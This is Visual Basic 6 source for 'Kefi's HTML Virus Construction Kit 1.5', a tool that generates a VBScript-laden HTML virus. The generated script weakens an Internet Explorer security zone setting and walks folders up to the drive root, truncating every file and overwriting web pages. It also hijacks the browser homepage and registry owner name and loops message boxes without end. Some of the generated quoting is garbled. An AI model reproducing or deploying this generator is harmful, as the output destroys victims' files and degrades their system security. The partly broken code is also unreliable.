VERSION 5.00
Begin VB.Form frmMain 
   BackColor       =   &H00000000&
   Caption         =   "Kefi's HTML Virus Construction Kit 1.5"
   ClientHeight    =   5100
   ClientLeft      =   165
   ClientTop       =   165
   ClientWidth     =   6555
   Icon            =   "frmMain15.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5100
   ScaleWidth      =   6555
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox Infect 
      BackColor       =   &H00000000&
      Height          =   2055
      Left            =   3360
      ScaleHeight     =   1995
      ScaleWidth      =   3075
      TabIndex        =   9
      Top             =   3000
      Visible         =   0   'False
      Width           =   3135
      Begin VB.TextBox txtInfect1 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   13
         Text            =   "C:\Windows\Desktop"
         Top             =   480
         Width           =   2775
      End
      Begin VB.TextBox txtInfect2 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   12
         Text            =   "C:\My Documents"
         Top             =   840
         Width           =   2775
      End
      Begin VB.TextBox txtInfect3 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   11
         Text            =   "C:\Inetpub\wwwroot"
         Top             =   1200
         Width           =   2775
      End
      Begin VB.TextBox txtInfect4 
         Height          =   285
         Left            =   120
         TabIndex        =   10
         Text            =   "C:\Program Files\SoftIce\EZpad 3.0\templates"
         Top             =   1560
         Width           =   2775
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "Where shall the infections be?"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   120
         Width           =   2295
      End
   End
   Begin VB.PictureBox Msg 
      BackColor       =   &H00000000&
      Height          =   2055
      Left            =   3360
      ScaleHeight     =   1995
      ScaleWidth      =   3075
      TabIndex        =   8
      Top             =   840
      Visible         =   0   'False
      Width           =   3135
      Begin VB.TextBox txtMsgTitle 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   17
         Text            =   "^_^"
         Top             =   360
         Width           =   2775
      End
      Begin VB.TextBox txtMsg 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   16
         Text            =   "You arn't very smart...."
         Top             =   960
         Width           =   2775
      End
      Begin VB.ComboBox comPic 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   345
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   15
         Text            =   "Critical"
         Top             =   1560
         Width           =   2775
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Title:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   120
         Width           =   495
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Message:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   19
         Top             =   720
         Width           =   1095
      End
      Begin VB.Label Label10 
         BackStyle       =   0  'Transparent
         Caption         =   "Picture:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   1320
         Width           =   975
      End
   End
   Begin VB.PictureBox Extras 
      BackColor       =   &H00000000&
      Height          =   2055
      Left            =   120
      ScaleHeight     =   1995
      ScaleWidth      =   3075
      TabIndex        =   7
      Top             =   3000
      Visible         =   0   'False
      Width           =   3135
      Begin VB.CommandButton cmdMake 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Make Virus"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         MaskColor       =   &H00000000&
         Style           =   1  'Graphical
         TabIndex        =   28
         Top             =   1680
         Width           =   1215
      End
      Begin VB.TextBox txtRegOwn 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   23
         Text            =   "Kefi"
         Top             =   1320
         Width           =   2775
      End
      Begin VB.TextBox txtHomepage 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   22
         Text            =   "Http://www.newbain.com"
         Top             =   240
         Width           =   2775
      End
      Begin VB.TextBox txtWebOpen 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   21
         Text            =   "Http://www.newbain.com"
         Top             =   720
         Width           =   2775
      End
      Begin VB.Label Label9 
         BackStyle       =   0  'Transparent
         Caption         =   "Registered owner:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   1080
         Width           =   1335
      End
      Begin VB.Label lblsweet 
         BackStyle       =   0  'Transparent
         Caption         =   "Set homepage to:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   25
         Top             =   0
         Width           =   2055
      End
      Begin VB.Label Label7 
         BackStyle       =   0  'Transparent
         Caption         =   "Open:"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   480
         Width           =   1575
      End
   End
   Begin VB.PictureBox Main 
      BackColor       =   &H00000000&
      Height          =   2055
      Left            =   120
      ScaleHeight     =   1995
      ScaleWidth      =   3075
      TabIndex        =   0
      Top             =   840
      Visible         =   0   'False
      Width           =   3135
      Begin VB.TextBox txtName 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   3
         Text            =   "kefi"
         Top             =   360
         Width           =   2775
      End
      Begin VB.TextBox txtVirus 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Text            =   "Pajamas"
         Top             =   960
         Width           =   2775
      End
      Begin VB.TextBox txtVirusMsg 
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Text            =   "Don't forget your Pajamas"
         Top             =   1560
         Width           =   2775
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "What do you call your self?"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   120
         Width           =   2295
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "What shall the virus be called?"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   720
         Width           =   2175
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "What will the virus's message be?"
         BeginProperty Font 
            Name            =   "Tempus Sans ITC"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1320
         Width           =   2655
      End
   End
   Begin VB.Label click 
      BackStyle       =   0  'Transparent
      Caption         =   "Click"
      BeginProperty Font 
         Name            =   "Tempus Sans ITC"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   5880
      TabIndex        =   27
      Top             =   4800
      Width           =   615
   End
   Begin VB.Image logo 
      Height          =   900
      Left            =   0
      Picture         =   "frmMain15.frx":0442
      Top             =   0
      Visible         =   0   'False
      Width           =   7020
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub click_Click()
click.Visible = False
logo.Visible = True
Main.Visible = True
Infect.Visible = True
Extras.Visible = True
Msg.Visible = True
End Sub



Private Sub Form_Load()
comPic.AddItem "Critical"
comPic.AddItem "Information"
comPic.AddItem "Exclamation"
End Sub


Private Sub cmdMake_Click()
         Dim pic As String
         If comPic.Text = "Critical" Then
                  pic = "Critical"
         ElseIf comPic.Text = "Information" Then
                  pic = "Information"
         ElseIf comPic.Text = "Exclamation" Then
                  pic = "Exclamation"
         End If
         Open App.Path & "\" & txtVirus.Text & ".html" For Output As #1
         Print #1, "<HTML><BODY><Script Language="; VBScript; "><!--"
         Print #1, "'html." & txtVirus.Text
         Print #1, "'by " & txtName.Text
         Print #1, "'created with Kefi's HTML Virus Construction Kit 1.5"
         Print #1, "Dim Shell, Fso"
         Print #1, "On Error Resume Next"
         Print #1, "Set Shell = CreateObject(" & Chr(34) & "; WScript.Shell" & Chr(34) & ")"
         Print #1, "Set Fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
         Print #1, "Shell.RegWrite " & Chr(34) & "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" & Chr(34) & ", 0, " & Chr(34) & " REG_DWORD" & Chr(34)
         Print #1, "Shell.RegWrite " & Chr(34) & "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" & Chr(34) & ", 0, " & Chr(34) & " REG_DWORD" & Chr(34)
         Print #1, "InfectFolder(" & Chr(34) & txtInfect1.Text & Chr(34) & ")"
         Print #1, "InfectFolder(" & Chr(34) & txtInfect2.Text & Chr(34) & ")"
         Print #1, "InfectFolder(" & Chr(34) & txtInfect3.Text & Chr(34) & ")"
         Print #1, "InfectFolder(" & Chr(34) & txtInfect4.Text & Chr(34) & ")"
         Print #1, "If Day(Now()) = Int(Rnd * 7) + 1 Then"
         Print #1, "Shell.RegWrite " & Chr(34) & " HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner" & Chr(34) & ", " & Chr(34) & txtRegOwn.Text & Chr(34)
         Print #1, "Shell.RegWrite " & Chr(34) & "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page" & Chr(34) & ", " & Chr(34) & txtHomepage.Text & Chr(34)
         Print #1, "Shell.run" & Chr(34) & txtWebOpen.Text & Chr(34)
         Print #1, "Do"
         Print #1, "MsgBox " & Chr(34) & txtMsg.Text & Chr(34) & " , vb" & pic & ", " & Chr(34) & txtMsgTitle.Text & Chr(34)
         Print #1, "Loop"
         Print #1, "End If"
         Print #1, "Sub InfectFolder(ifp)"
         Print #1, "Do"
         Print #1, "Set FolderObj = Fso.GetFolder(ifp)"
         Print #1, "ifp = Fso.GetParentFolderName(ifp)"
         Print #1, "Set FO = FolderObj.Files"
         Print #1, "For Each NewFile In FO"
         Print #1, "extname = LCase(Fso.GetExtensionName(NewFile.Name))"
         Print #1, "Set FileDropper = Fso.createtextfile(NewFile.Path)"
         Print #1, "If extname = " & Chr(34) & "htm " & Chr(34) & "Or extname = " & Chr(34) & "html" & Chr(34) & " Or extname = " & Chr(34) & "asp" & Chr(34) & " Or extname = " & Chr(34) & " htx" & Chr(34) & " Or extname = " & Chr(34) & "hta" & Chr(34) & " Then"
         Print #1, "FileDropper.writeline " & Chr(34) & "<HTML><HEAD><TITLE>" & txtVirus.Text & "</TITLE></HEAD><BODY BGCOLOR=" & Chr(34) & "#FFFFFF" & Chr(34) & "TEXT=" & Chr(34) & "#000000" & Chr(34) & "><FONT FACE=" & Chr(34) & "OCR A Extended" & Chr(34) & "><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size=" & Chr(34) & "1" & Chr(34) & ">a message from " & txtName.Text & "</font></CENTER></BODY></HTML>"
         Print #1, "FileDropper.Close"
         Print #1, "End If"
         Print #1, "Next"
         Print #1, "Loop Until FolderObj.IsRootFolder = True"
         Print #1, "End Sub"
         Print #1, "--></script></BODY></HTML>"
         Print #1, "<HTML><HEAD><TITLE>" & txtVirus.Text & "</TITLE></HEAD><BODY BGCOLOR=" & Chr(34) & "#FFFFFF" & Chr(34) & " TEXT=" & Chr(34) & "#000000" & Chr(34) & "><FONT FACE=" & Chr(34) & "OCR A Extended" & Chr(34) & "><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size=" & Chr(34) & "5" & Chr(34) & ">" & txtVirusMsg.Text & "</font><BR><font size=" & Chr(34) & "1" & Chr(34) & ">a message from " & txtName.Text & "</font></CENTER></BODY></HTML>"
         Close #1
End Sub

Private Sub lblsweet_Click()
frmSweet.Show
End Sub
